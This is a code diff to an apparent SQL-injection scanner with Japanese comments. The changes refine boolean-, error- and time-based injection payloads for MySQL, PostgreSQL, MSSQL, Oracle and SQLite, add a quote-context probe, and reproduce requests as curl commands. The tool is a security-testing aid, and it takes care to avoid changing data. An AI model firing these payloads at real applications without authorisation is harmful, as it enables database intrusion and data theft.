@@ -124,36 +124,77 @@ BOUNDARIES = [
 ]
 # 式コンテキスト（コメントで後ろを消せない / WHERE 句ではない場所）用の境界。op は空。
 # 条件が真なら「値を変えない」式になり、偽のときだけ SQL エラーになる式を差し込む。
-#   num: 数値の位置（WHERE id=<値> / IN (<値>) / 関数の引数 / VALUES の数値） … <値>-(0)
-#   str: 文字列の中（WHERE name='<値>' / INSERT・UPDATE の文字列値）          … '<値>'||''
-#   lst: 並びの後ろ（ORDER BY / GROUP BY / IN の並び）                         … <値>,(NULL)
-# 真のときに 1 や 'a' を返す形にすると、IN (...) に別の ID が増えたり別の行を指したりするので 0 / '' / NULL に限る。
-# 偽の側は「複数行を返す副問い合わせ」。SQLite はこれをエラーにしない（先頭行を使う）ので、
-# 先頭行も 0 / '' / NULL になる UNION ALL にし、SQLite には整数オーバーフローを使う専用の形を別に持つ。
+#   num: 元の値が数値のとき。1 を掛ける:
+#          WHERE price > 2*(CASE WHEN (条件) THEN 1 WHEN <エラーになる式> THEN 1 END)*100
+#        掛け算なので、後ろに *100 が続いても、前に 1000- があっても、IN (…) や関数の引数の中でも元の値のまま。
+#        「<値>-(0)」のように引く形は <値>-(0)*100 = <値> になってしまうので使わない。
+#        値が実は引用符の中だった場合も、文字列の先頭が元の数字のままなので、MySQL の数値比較は変わらない。
+#   val: 元の値が数値でないとき（ORDER BY / GROUP BY の列名など）。値そのものを CASE で包む:
+#          ORDER BY (CASE WHEN (条件) THEN name WHEN <エラーになる式> THEN name END) DESC
+#        {v} は検査時に元の値へ置き換える。この形を送るときは元の値を前に付けない（WRAP_PREFIX で見分ける）。
+#        引用符の中に入ると文字列の中身を丸ごと置き換えてしまうので、引用符の外だと分かったときだけ使う。
+#   num / val とも、どちらの枝も同じ値を返すので型が食い違わず、エラーが握り潰される DELETE IGNORE でも
+#   「元の値」か NULL にしかならない。
+#   str: 文字列の中（WHERE name='<値>' / INSERT・UPDATE の文字列値） … '<値>'||''
+#   lst: 並びの後ろに足す形 … <値>,(NULL)。上の形が構文に合わない ORDER BY「name ASC」等のための予備で、
+#        IN の並びに値を足したり ORDER BY の向きを変えたりし得るので、参照系（GET / --risk 2）でしか使わない。
 #
 # 文字列の連結（|| / +）は DBMS ごとに意味が違う。MySQL では || が OR、+ が加算なので、連結のつもりの式が
 #   WHERE name='v'||(…)||'' AND owner=7  →  (name='v') OR (…) OR ('' AND owner=7)
 # となり、後ろの条件が外れて他人の行に一致する。そこで連結形にはその DBMS にしか無い関数・変数
 #（pg_backend_pid / sqlite_version / ORA_HASH / @@SPID）を入れ、ほかの DBMS では実行前のエラーで止まるようにしてある。
+# SQLite は「複数行を返す副問い合わせ」をエラーにしない（先頭行を使う）ので、整数オーバーフローを使う専用の形を持つ。
 # 最後の要素は「GET 以外・--risk 1 でも送ってよいか」。
+WRAP_PREFIX = "(CASE WHEN ("
+_ERR_MULTI = "(SELECT 1 UNION ALL SELECT 1)=1"
+_ERR_MULTI_ORA = "(SELECT 1 FROM DUAL UNION ALL SELECT 1 FROM DUAL)=1"
+_ERR_SQLITE = "abs(-9223372036854775808)=0"
 EXPR_BOUNDS = [    # (対象 DBMS, 種別, 接頭辞, 接尾辞, 安全か)。対象 None は MySQL / PostgreSQL / MSSQL / Oracle 23 共通
-    (None,         "num", "-(CASE WHEN (", ") THEN 0 ELSE (SELECT 0 UNION ALL SELECT 0) END)", True),
+    (None,         "num", "*(CASE WHEN (", ") THEN 1 WHEN " + _ERR_MULTI + " THEN 1 END)", True),
+    (None,         "val", WRAP_PREFIX, ") THEN {v} WHEN " + _ERR_MULTI + " THEN {v} END)", True),
     ("PostgreSQL", "str", "'||(SELECT CASE WHEN pg_backend_pid()>0 AND (",
                           ") THEN '' ELSE (SELECT '' UNION ALL SELECT '') END)||'", True),
     # MySQL 用（下の MYSQL_STR_BOUNDS の「括弧を閉じない」形）。GET 以外・--risk 1 では深い括弧から順に試すので、ここでは外す
     ("MySQL",      "str", "'=(SELECT '1' FROM DUAL WHERE @@sql_mode IS NOT NULL AND (CASE WHEN (",
                           ") THEN 1 ELSE (SELECT 1 UNION ALL SELECT 1) END)=1) AND 'a'='a", False),
-    (None,         "lst", ",(SELECT CASE WHEN (", ") THEN NULL ELSE (SELECT 0 UNION ALL SELECT 0) END)", True),
+    # 偽の側は整数型の NULL を 2 行（SQLite が先頭行を使っても IN の並びに値が増えず、PostgreSQL でも型が合う）
+    (None,         "lst", ",(SELECT CASE WHEN (", ") THEN NULL ELSE (SELECT 0+NULL UNION ALL SELECT 0+NULL) END)", False),
     ("MSSQL",      "str", "'+(SELECT CASE WHEN @@SPID>0 AND (", ") THEN '' ELSE (SELECT '' UNION ALL SELECT '') END)+'", True),
-    ("SQLite",     "num", "-(CASE WHEN (", ") THEN 0 ELSE abs(-9223372036854775808) END)", True),
+    ("SQLite",     "num", "*(CASE WHEN (", ") THEN 1 WHEN " + _ERR_SQLITE + " THEN 1 END)", True),
+    ("SQLite",     "val", WRAP_PREFIX, ") THEN {v} WHEN " + _ERR_SQLITE + " THEN {v} END)", True),
     ("SQLite",     "str", "'||(CASE WHEN sqlite_version()>'' AND (", ") THEN '' ELSE abs(-9223372036854775808) END)||'", True),
-    ("SQLite",     "lst", ",(CASE WHEN (", ") THEN NULL ELSE abs(-9223372036854775808) END)", True),
-    ("Oracle",     "num", "-(CASE WHEN (", ") THEN 0 ELSE (SELECT 0 FROM DUAL UNION ALL SELECT 0 FROM DUAL) END)", True),
+    ("SQLite",     "lst", ",(CASE WHEN (", ") THEN NULL ELSE abs(-9223372036854775808) END)", False),
+    ("Oracle",     "num", "*(CASE WHEN (", ") THEN 1 WHEN " + _ERR_MULTI_ORA + " THEN 1 END)", True),
+    ("Oracle",     "val", WRAP_PREFIX, ") THEN {v} WHEN " + _ERR_MULTI_ORA + " THEN {v} END)", True),
+    ("Oracle",     "val", WRAP_PREFIX, ") THEN {v} WHEN 1/0=1 THEN {v} END)", True),     # GROUP BY（副問い合わせが書けない）用
     ("Oracle",     "str", "'||(SELECT CASE WHEN ORA_HASH('a')>=0 AND (",
                           ") THEN NULL ELSE (SELECT 'a' FROM DUAL UNION ALL SELECT 'a' FROM DUAL) END FROM DUAL)||'", True),
-    ("Oracle",     "lst", ",(CASE WHEN (", ") THEN NULL ELSE (SELECT 0 FROM DUAL UNION ALL SELECT 0 FROM DUAL) END)", True),
-    ("Oracle",     "lst", ",(CASE WHEN (", ") THEN NULL ELSE 1/0 END)", True),      # GROUP BY（副問い合わせが書けない）用
+    ("Oracle",     "lst", ",(CASE WHEN (", ") THEN NULL ELSE (SELECT NULL FROM DUAL UNION ALL SELECT NULL FROM DUAL) END)", False),
 ]
+_NUMERIC = re.compile(r"-?\d+(\.\d+)?")
+
+
+def kind_ok(kind, ctx):
+    """この種別の式を、この注入点に送ってよいか。
+       num は元の値が数値のときだけ、val は数値でないときだけ。
+       GET 以外・--risk 1 では、引用符の中だと分かっている値に num / val を、外だと分かっている値に str を送らない。
+       val（値ごと包む）は、引用符の外だと分かったときだけ送る。"""
+    v = ctx.pt["pre"]
+    if kind == "num" and not _NUMERIC.fullmatch(v):
+        return False
+    if kind == "val" and (not v or _NUMERIC.fullmatch(v)):
+        return False
+    if allow_comment():
+        return True
+    if kind in ("num", "val") and ctx.quote:
+        return False
+    if kind == "val" and not ctx.numeric:
+        return False
+    if kind == "str" and ctx.numeric:
+        return False
+    return kind != "lst"
+
+
 # MySQL / MariaDB の文字列用。MySQL には文字列の位置で「値を変えない式」が無い（|| は OR、+ は加算）ので、
 # クォートを閉じたあと「比較の結果」に副問い合わせをつなぐ:
 #   WHERE name='v'=(SELECT '1' FROM DUAL WHERE @@sql_mode IS NOT NULL AND <条件>) AND 'a'='a' AND owner=7
@@ -165,41 +206,65 @@ EXPR_BOUNDS = [    # (対象 DBMS, 種別, 接頭辞, 接尾辞, 安全か)。�
 #   DELETE IGNORE / UPDATE IGNORE がエラーを握り潰しても「元と同じ」か「0 行」にしかならないようにするため
 #  （比較の右辺に直接置くと、握り潰されたとき 0 になって一致が反転する）。
 # ・@@sql_mode を入れてあるので、ほかの DBMS では実行前にエラーになる。
+# ・time ではもう 1 つ、定数の AND 項（' AND NOT @@sql_mode IS NULL AND <遅延> AND 'a'='a）も使う。MySQL 8 は、ほかの条件で
+#   行が 1 つも残らないとき（ログインフォームのパスワード側など）上の式を評価しないが、表に依存しない AND の項は先に 1 回
+#   評価するため。先頭を NOT にしてあるのは、BETWEEN 'v' AND 'n' の下限に入ったとき構文エラーにするため
+#  （「AND @@sql_mode IS NOT NULL」だと (col BETWEEN 'v' AND @@sql_mode) IS NOT NULL と解釈され、全行に一致する）。
 # 値が括弧の中（IN ('v') / LOWER('v') / ('v')）にあると、この式は「値」の一部になって別の行に効く。
-# 括弧を多く閉じすぎた形は構文エラーで止まる（無害）ので、深い方から順に試し、構文として通った深さで打ち切る
-#（それより浅い形は送らない）。対応するのは括弧 2 重まで。
+# 括弧を多く閉じすぎた形は構文エラーで止まるので、深い方から順に試し、構文として通った深さで打ち切る
+#（それより浅い形は送らない）。対応するのは括弧 2 重まで。括弧を閉じる形の末尾は '1' IN ('1 にしてある:
+#   IN ('v','x') のように後ろにカンマが続いても通り（'1' IN ('1','x') は真）、
+#   (name='v' AND price=999) のように後ろに条件が続いても、その条件が残る（'1' IN ('1' AND price=999) は条件が真のときだけ真）。
+#   'a' IN ('a … だと 'a' AND 偽 = 0、'a'=0 が真になり、後ろの条件が外れてしまう。
+# それでも見分けられない場合があり、README の「残る危険」に挙げてある（後ろの引数を省けない関数、副問い合わせの中、
+# REPLACE / ON DUPLICATE KEY UPDATE のキー、3 重以上の括弧）。
+def _mysql_tail(q, depth):
+    return ("%s1%s IN (" % (q, q) + "(" * (depth - 1) + "%s1" % q) if depth else "%sa%s=%sa" % (q, q, q)
+
+
 def _mysql_str(q, depth):
-    return (q + ")" * depth + "=(SELECT '1' FROM DUAL WHERE @@sql_mode IS NOT NULL AND ",
-            ") AND " + "(" * depth + "%sa%s=%sa" % (q, q, q))
+    return (q + ")" * depth + "=(SELECT '1' FROM DUAL WHERE @@sql_mode IS NOT NULL AND ", ") AND " + _mysql_tail(q, depth))
 
 
 def _mysql_and(q, depth):
-    return (q + ")" * depth + " AND @@sql_mode IS NOT NULL AND ", " AND " + "(" * depth + "%sa%s=%sa" % (q, q, q))
+    return (q + ")" * depth + " AND NOT @@sql_mode IS NULL AND ", " AND " + _mysql_tail(q, depth))
 
 
 _MYSQL_DEPTHS = [(q, depth) for q in ("'", "\"") for depth in (2, 1, 0)]
 # boolean 用: (接頭辞, 接尾辞)。条件が偽なら副問い合わせが複数行になり SQL エラー
 MYSQL_STR_BOUNDS = [(_mysql_str(q, d)[0] + "(CASE WHEN (",
                      ") THEN 1 ELSE (SELECT 1 UNION ALL SELECT 1) END)=1" + _mysql_str(q, d)[1]) for q, d in _MYSQL_DEPTHS]
-# time 用。前半は上と同じ形。後半は定数の AND: MySQL 8 は、ほかの条件で行が 1 つも残らないとき（ログインフォームの
-# パスワード側など）前半の式を評価しないが、表に依存しない AND の項は先に 1 回評価する。INSERT / UPDATE の値の中では
-# 逆に前半しか遅延しない。
+# time 用: 条件の位置に遅延の式を入れる。前半は上と同じ形、後半は定数の AND 項
 MYSQL_STR_TIME_BOUNDS = [_mysql_str(q, d) for q, d in _MYSQL_DEPTHS] + [_mysql_and(q, d) for q, d in _MYSQL_DEPTHS]
 # 接頭辞 → (クォート, 括弧の深さ)。「この深さで構文が通った」と分かったら、同じクォートのそれより浅い形は送らない
 MYSQL_DEPTH = dict((b[0], qd) for bs in (MYSQL_STR_BOUNDS, MYSQL_STR_TIME_BOUNDS)
                    for b, qd in zip(bs, _MYSQL_DEPTHS + _MYSQL_DEPTHS))
-# time 用の式コンテキスト境界（連結・演算・並びに埋め込む）。中身は各 DBMS の遅延式。
-# 遅延したあとの値は 0 / '' / NULL（元の値を変えない）。MySQL の文字列だけは上と同じ理由で「比較の結果」につなぐ形。
+_MYSQL_SYNTAX = re.compile(r"error in your SQL syntax", re.IGNORECASE)
+# time 用の式コンテキスト境界。中身は各 DBMS の遅延式。(種別, 接頭辞, 接尾辞)。種別の意味は EXPR_BOUNDS と同じ
 # ほかの DBMS の連結形は、中の遅延式（PG_SLEEP / DBMS_PIPE / sqlite_version 入りの重い処理）が MySQL では実行前にエラーになる。
+# num / val は boolean と同じ形（2 つ目の WHEN がエラーになる式）。「THEN 1 ELSE 1」のように両方の枝を同じ定数にすると、
+# Oracle は条件を評価せずに定数へ畳んでしまい、遅延しない。
+def _num_val_time(err):
+    return [("num", "*(CASE WHEN (", ") THEN 1 WHEN " + err + " THEN 1 END)"),
+            ("val", WRAP_PREFIX, ") THEN {v} WHEN " + err + " THEN {v} END)")]
+
+
 TIME_EXPR_BOUNDS = {
     # 文字列は深い括弧から順（MYSQL_STR_TIME_BOUNDS）。遅延したら構文として通った証拠なので、それより浅い形は送らない
-    "MySQL":      MYSQL_STR_TIME_BOUNDS
-                  + [("-(SELECT 0 FROM DUAL WHERE ", ")"), (",(SELECT NULL FROM DUAL WHERE ", ")")],
-    "PostgreSQL": [("'||(SELECT '' WHERE ", ")||'"), ("-(SELECT 0 WHERE ", ")"), (",(SELECT NULL WHERE ", ")")],
-    "Oracle":     [("'||(SELECT NULL FROM DUAL WHERE ", ")||'"), ("-(SELECT 0 FROM DUAL WHERE ", ")"),
-                   (",(SELECT NULL FROM DUAL WHERE ", ")")],
-    "SQLite":     [("'||(SELECT '' WHERE ", ")||'"), ("-(SELECT 0 WHERE ", ")"), (",(SELECT NULL WHERE ", ")")],
+    "MySQL":      [("str", pre, suf) for pre, suf in MYSQL_STR_TIME_BOUNDS]
+                  + _num_val_time(_ERR_MULTI) + [("lst", ",(SELECT NULL FROM DUAL WHERE ", ")")],
+    "PostgreSQL": [("str", "'||(SELECT '' WHERE ", ")||'")] + _num_val_time(_ERR_MULTI)
+                  + [("lst", ",(SELECT NULL WHERE ", ")")],
+    "Oracle":     [("str", "'||(SELECT NULL FROM DUAL WHERE ", ")||'")] + _num_val_time(_ERR_MULTI_ORA)
+                  + [("lst", ",(SELECT NULL FROM DUAL WHERE ", ")")],
+    "SQLite":     [("str", "'||(SELECT '' WHERE ", ")||'")] + _num_val_time(_ERR_SQLITE)
+                  + [("lst", ",(SELECT NULL WHERE ", ")")],
 }
+
+
+def time_expr_bounds(d, ctx):
+    """DBMS d の time 用の式コンテキスト境界 (接頭辞, 接尾辞)。{v} を元の値に置き換え、送れないものを除く。"""
+    return [(pre, suf.replace("{v}", ctx.pt["pre"])) for kind, pre, suf in TIME_EXPR_BOUNDS.get(d, []) if kind_ok(kind, ctx)]
 
 # time / union で境界が未確定のときに試す接頭辞（多い順）
 QUICK_PREFIXES = ["'", "", "\"", "')", ")", "\")"]
@@ -744,7 +809,13 @@ def _log(pt, payload, ts, method, url, headers, body, resp):
     CFG.log.flush()
 
 
+def eff_base(payload, base):
+    """値ごと CASE で包む形（WRAP_PREFIX）は、元の値を式の中に持っているので前には付けない。"""
+    return "" if (base is None and payload.startswith(WRAP_PREFIX)) else base
+
+
 def send(pt, payload, base=None):
+    base = eff_base(payload, base)
     payload = tamper(payload)
     method, url, headers, body = build(pt, payload, base)
     data = body.encode("utf-8", "surrogateescape") if body is not None else None
@@ -838,6 +909,7 @@ class Ctx:
         self.heavy = None       # 重い処理で検出したとき (DBMS, 式, n, 実測秒)
         self.tref = None        # boolean の「真」応答（UNION の基準に使う）
         self.floor = {}         # MySQL の文字列の式: クォート → 構文が通った括弧の深さ（これより浅い形は送らない）
+        self.qprobed = False    # 値が引用符の中か外かを調べ終えたか（quote / numeric）
         self.kinds = set()      # 検出できた手法
         self.strong = False     # 確定と言える根拠があるか（boolean / time / union / DBMS 固有のエラー文）
         self.hits = []          # JSON 出力用
@@ -950,6 +1022,8 @@ def test_error(ctx):
         if r1.status == ctx.base.status or r1.status in WAF_STATUS:
             continue
         r2 = send(ctx.pt, q + q)
+        if not r2.bad and r2.status == r1.status and q == "'":
+            ctx.numeric = True          # '' でも同じ壊れ方 → 引用符の外
         if not r2.bad and r2.status == ctx.base.status:
             r3 = send(ctx.pt, q)        # 一過性のエラー（対象側の接続失敗など）を拾わないよう、もう一度壊れることを確かめる
             if r3.bad or r3.status != r1.status:
@@ -958,6 +1032,35 @@ def test_error(ctx):
             ctx.hit("QUOTE", strong=False, payload=q, status=r1.status, evidence=evidence(r1))
             print("  %s[QUOTE ]%s %s で HTTP %d、%s で HTTP %d に戻る → クォートが SQL に届いている可能性大"
                   % (G, N, repr(q), r1.status, repr(q + q), r2.status))
+
+
+def probe_quote(ctx):
+    """値が引用符の中（quote）か外（numeric）かを、' と '' の応答だけで見分ける。-t に E が無いとき用。
+       GET 以外・--risk 1 では、これが分かっていないと送れない式がある（kind_ok）。"""
+    ctx.qprobed = True
+    if ctx.quote or ctx.numeric:
+        return
+    err = lambda r: (not r.bad) and r.status not in WAF_STATUS and (
+        bool(ctx.new_db(r)) or r.status != ctx.base.status or (ctx.thr == 0 and ctx.differ(r, ctx.base)))
+    for q in ("'", "\""):
+        r1 = send(ctx.pt, q)
+        if not err(r1):
+            continue
+        r2 = send(ctx.pt, q + q)
+        if r2.bad:
+            continue
+        if ctx.new_db(r1):
+            still = bool(ctx.new_db(r2))
+        elif r1.status != ctx.base.status:
+            still = r2.status == r1.status
+        else:
+            still = not ctx.differ(r2, r1)
+        if not still:
+            ctx.quote = q
+            return
+        if q == "'":
+            ctx.numeric = True
+            return
 
 
 # ── 2) boolean-based ─────────────────────────────────
@@ -983,8 +1086,8 @@ def expr_bounds(ctx):
             ok = ctx.dbms not in ("Oracle", "SQLite")       # SQLite は複数行の副問い合わせがエラーにならない
         else:
             ok = ctx.dbms in (None, d)
-        if ok and (safe or allow_comment()):
-            out.append((kind, pre, suf))
+        if ok and (safe or allow_comment()) and kind_ok(kind, ctx):
+            out.append((kind, pre, suf.replace("{v}", ctx.pt["pre"])))
     first = "str" if ctx.quote == "'" else ("num" if ctx.numeric else None)
     out.sort(key=lambda e: e[0] != first)                   # 安定ソート: 種別の合うものを前へ
     return [(pre, suf) for _, pre, suf in out]
@@ -992,7 +1095,8 @@ def expr_bounds(ctx):
 
 def mysql_str_bounds(ctx):
     """GET 以外・--risk 1 用の MySQL 文字列の境界を (接頭辞, 接尾辞, クォート) で返す。深い括弧から順。"""
-    bs = [(pre, suf, MYSQL_DEPTH[pre][0]) for pre, suf in MYSQL_STR_BOUNDS if ctx.dbms in (None, "MySQL")]
+    bs = [(pre, suf, MYSQL_DEPTH[pre][0]) for pre, suf in MYSQL_STR_BOUNDS
+          if ctx.dbms in (None, "MySQL") and not ctx.numeric]
     if ctx.quote:
         bs.sort(key=lambda b: b[2] != ctx.quote)
     return bs
@@ -1022,16 +1126,16 @@ def bool_candidates(ctx):
         yield pre, suf, "", None
 
 
-def safe_guess(d, numeric, quote):
+def safe_guess(d, numeric, quote, v):
     """GET 以外・--risk 1 で境界が未確定のまま提示するときの閉じ方。ツール自身が送るのと同じ「値を変えない」形にする。"""
     if not numeric and d == "MySQL":
         pre, suf = MYSQL_STR_BOUNDS[5 if quote == '"' else 2]       # 括弧を閉じない形
         return pre, suf, ""
-    kind = "num" if numeric else "str"
+    kind = "str" if not numeric else ("num" if _NUMERIC.fullmatch(v) else "val")
     for want in (d, None):
         for dd, k, pre, suf, safe in EXPR_BOUNDS:
             if dd == want and k == kind and safe:
-                return pre, suf, ""
+                return pre, suf.replace("{v}", v), ""
     return MYSQL_STR_BOUNDS[2][0], MYSQL_STR_BOUNDS[2][1], ""
 
 
@@ -1045,23 +1149,35 @@ def test_boolean(ctx):
     # エラーも見えず真偽の差は出ないので、その組は送らない
     err_ref, closed = {}, set()
 
-    def broken(q, r):
-        """r は「構文エラーのときの応答」に見えるか。"""
+    def parsed(q, r):
+        """MySQL 用の式を送った応答 r から「この深さで構文として通ったか」を判定する。
+           True = 通った（これより浅い形は送らない） / False = 構文エラー（1 つ浅い形へ） / None = 判定できない。"""
         e = err_ref[q]
-        return bool(ctx.new_db(r)) or (r.fp[0] != ctx.base.fp[0] and r.fp[0] == e.fp[0]) or not ctx.differ(r, e)
+        if ctx.new_db(e):                           # エラー文が見える対象
+            if not ctx.new_db(r):
+                return True
+            # 構文エラー以外（引数の数・行コンストラクタ等）は「括弧の位置は合っているが別の理由で失敗」。浅い形へは進まない
+            return not _MYSQL_SYNTAX.search(r.clean)
+        if e.fp[0] != ctx.base.fp[0]:               # エラーがステータスで分かる対象（文面は無い）
+            return r.fp[0] != e.fp[0]
+        if ctx.thr == 0:                            # 同じステータス・静的ページ: エラーページと完全一致かどうか
+            return ctx.differ(r, e)
+        return None                                 # 中身が揺れるページでエラーも見分けられない
 
     for pre, suf, op, group in bool_candidates(ctx):
         if group:
             if group not in err_ref:
                 e = err_ref[group] = send(pt, group)
-                if e.bad or not (ctx.new_db(e) or ctx.differ(e, ctx.base)):
+                # エラーが見えない / 見分けられない対象では、深さの判定ができないので送らない
+                seen = ctx.new_db(e) or e.fp[0] != ctx.base.fp[0] or (ctx.thr == 0 and ctx.differ(e, ctx.base))
+                if e.bad or not seen:
                     closed.add(group)
             if group in closed:
                 continue
         mk = lambda a, b: cond_payload(pre, op, "%d=%d" % (a, b), suf)
         t1, f1 = send(pt, mk(NUM_A, NUM_A)), send(pt, mk(NUM_A, NUM_A + 1))
-        if group and not t1.bad and not broken(group, t1):
-            closed.add(group)       # この深さで構文が通った。これより浅い形は値の位置に入ってしまうので送らない
+        if group and (t1.bad or parsed(group, t1) is not False):
+            closed.add(group)       # この深さで構文が通った（か、判定できない）。これより浅い形は値の位置に入り得るので送らない
             ctx.floor[group] = MYSQL_DEPTH[pre][1]
         if t1.bad or f1.bad or blocked(t1) or blocked(f1) or not ctx.differ(t1, f1):
             continue        # 片方だけ WAF に遮断された差は、SQL の真偽による差ではない
@@ -1149,7 +1265,7 @@ def time_candidates(ctx):
     if not ctx.bound:           # INSERT / UPDATE の値、数値の位置、ORDER BY に埋め込む形
         for d in dbs:
             inline = [core for kind, core in TIME_CORES[d] if kind == "inline"]
-            for pre, suf in TIME_EXPR_BOUNDS.get(d, []) if inline else []:
+            for pre, suf in time_expr_bounds(d, ctx) if inline else []:
                 c = make(d, "inline", inline[0], pre, suf, "")
                 if c:
                     yield c
@@ -1167,10 +1283,12 @@ def test_time(ctx):
         if r.timeout:
             timeouts += 1
             continue
+        if qd and (slow(r) or (ctx.new_db(r) and not _MYSQL_SYNTAX.search(r.clean))):
+            # 遅延した = この深さで構文が通った。構文エラー以外の DB エラー = 括弧の位置は合っている。
+            # どちらも、これより浅い形（値の位置に入ってしまう）には進まない
+            ctx.floor[qd[0]] = max(ctx.floor.get(qd[0], -1), qd[1])
         if not slow(r):
             continue
-        if qd:                  # 遅延した = この深さで構文が通った（確認に失敗しても、これより浅い形には進まない）
-            ctx.floor[qd[0]] = max(ctx.floor.get(qd[0], -1), qd[1])
         # 対照（0 秒）が速く、もう一度送って再び遅い → 確定
         c = send(pt, fn(0))
         if c.bad or c.elapsed >= ctx.base_time + S * 0.5:
@@ -1214,7 +1332,7 @@ def test_heavy(ctx):
         steps = HEAVY[d] + (HEAVY_RISK2.get(d, []) if CFG.risk >= 2 else [])
         bounds = list(time_bounds(ctx))
         if not ctx.bound:
-            bounds += [(p, s, "") for p, s in TIME_EXPR_BOUNDS[d]]
+            bounds += [(p, s, "") for p, s in time_expr_bounds(d, ctx)]
         for pre, suf, op in bounds:
             for tmpl, size in steps:
                 fn = lambda n: cond_payload(pre, op, "1=" + tmpl.format(n=n), suf)
@@ -1432,6 +1550,7 @@ def _raw_only(s):
 
 def curl_cmd(pt, payload, base=None):
     """sqljr が送ったのと同じリクエストになる curl コマンドを、人が編集しやすい形（--data-urlencode）で作る。"""
+    base = eff_base(payload, base)
     payload = tamper(payload)
     w, key = pt["where"], pt["key"]
     val = (pt["pre"] if base is None else base) + payload + pt["post"]
@@ -1536,7 +1655,7 @@ def suggest(ctx):
             for n, (note, tmpl) in enumerate(I["err"]):
                 for title, qy in (steps[:4] if n == 0 else steps[:1]):     # 別形は 1 手だけ出す
                     # 境界が未確定で、後続を消す形を出せない状況では、DBMS ごとの「値を変えない」形に載せる
-                    b = (pre, suf, op) if (ctx.bound or cut_ok) else safe_guess(d, numeric, ctx.quote)
+                    b = (pre, suf, op) if (ctx.bound or cut_ok) else safe_guess(d, numeric, ctx.quote, pt["pre"])
                     out.append((tag + "error-based: %s をエラー文に出させる%s" % (title, note),
                                 cond_payload(b[0], b[2], tmpl.format(q=qy), b[1]), None))
         probe = I["chr"].format(q=I["user"] if d != "SQLite" else I["tables"]) + ">77"
@@ -1638,6 +1757,7 @@ def print_suggestions(ctx):
     res = []
     for i, (title, payload, base) in enumerate(sug, 1):
         shown = tamper(payload)             # 「値」も「コマンド」も実際に送る形（tamper 適用後）
+        base = eff_base(payload, base)
         value = (pt["pre"] if base is None else base) + shown + pt["post"]
         if pt["where"] in ("PATH", "BODY"):
             value = shown
@@ -1664,8 +1784,17 @@ def scan_point(pt, tech, prev=None):
     blocked0 = CFG.blocked
     if not baseline(ctx):
         return None
+    if not allow_comment() and (ctx.base.status >= 500 or ctx.base_dbs):
+        why = "HTTP %d" % ctx.base.status if ctx.base.status >= 500 else "DB エラーの文面が出ている"
+        print("  %s[!] 元のリクエスト自体が失敗しています（%s）。この値では元の SQL が壊れている可能性が高く、GET 以外・--risk 1 では、"
+              "壊れた文にペイロードを足すと意図しない文になり得るので検査しません。正常に通る値で指定し直すか、"
+              "参照系と分かっているなら --risk 2 で実行してください。%s" % (Y, why, N))
+        return ctx
     if "E" in tech and not prev:
         test_error(ctx)
+        ctx.qprobed = True
+    if not allow_comment() and not ctx.qprobed:
+        probe_quote(ctx)
     if "B" in tech:
         test_boolean(ctx)
     if "T" in tech:
